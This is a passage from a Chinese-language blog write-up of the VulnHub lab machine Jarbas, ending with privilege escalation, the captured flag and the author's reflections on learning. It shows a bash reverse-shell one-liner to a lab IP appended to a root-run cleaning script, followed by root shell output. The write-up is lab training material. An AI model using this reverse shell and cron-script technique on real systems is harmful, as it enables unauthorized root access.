</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>echo &#34;/bin/bash -i &gt;&amp; /dev/tcp/192.168.152.131/3333 0&gt;&amp;1&#34; &gt;&gt; /etc/script/CleaningScript.sh
</span></span></code></pre></td></tr></table></div></div><p>再次查看脚本，确认命令正确写入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>bash-4.2$ cat ./script/CleaningScript.sh
</span></span><span class=line><span class=cl>cat ./script/CleaningScript.sh
</span></span><span class=line><span class=cl>#!/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rm -rf /var/log/httpd/access_log.txt
</span></span><span class=line><span class=cl>/bin/bash -i &gt;&amp; /dev/tcp/192.168.152.131/3333 0&gt;&amp;1
</span></span></code></pre></td></tr></table></div></div><p>确认无误，等待命令自动执行，成功反弹shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>[root@jarbas ~]# whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>[root@jarbas ~]# ip a
</span></span><span class=line><span class=cl>ip a
</span></span><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 ::1/128 scope host 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000
</span></span><span class=line><span class=cl>    link/ether 00:0c:29:cd:d8:cf brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 192.168.152.133/24 brd 192.168.152.255 scope global dynamic ens33
</span></span><span class=line><span class=cl>       valid_lft 1421sec preferred_lft 1421sec
</span></span><span class=line><span class=cl>    inet6 fe80::9114:a460:aa3:9dd5/64 scope link 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></td></tr></table></div></div><p>确认权限和ip正确</p><p>得到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>[root@jarbas ~]# cat flag.txt
</span></span><span class=line><span class=cl>cat flag.txt
</span></span><span class=line><span class=cl>Hey!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Congratulations! You got it! I always knew you could do it!
</span></span><span class=line><span class=cl>This challenge was very easy, huh? =)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thanks for appreciating this machine.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@tiagotvrs
</span></span></code></pre></td></tr></table></div></div><h2 id=总结>总结</h2><p>目前虽然还处于初步学习的过程，比上一台相比，对于信息搜集更加熟练，对问题信息也更加敏感，需要注意的是对于部分常用遇到的系统需要更加规范的去进行整理，比如这次遇到的jenkins，很多可利用的点可以挨个尝试，红笔师傅使用的是新建项目的命令行执行，进行反弹shell的操作，而我使用的是命令行的执行漏洞，略有不同，以后可多加尝试。暂时需要的是极大的增加学习的广度，与知识面。</p></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=prev href=https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>VulnHub-SickOS1.1</span></a>
<a class=next href=https://wh1tej0ker.github.io/post/vulnhubw1r3s101-zep7pg.html><span>VulnHub-w1r3s-1.0.1</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2025 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==" crossorigin=anonymous defer></script></html>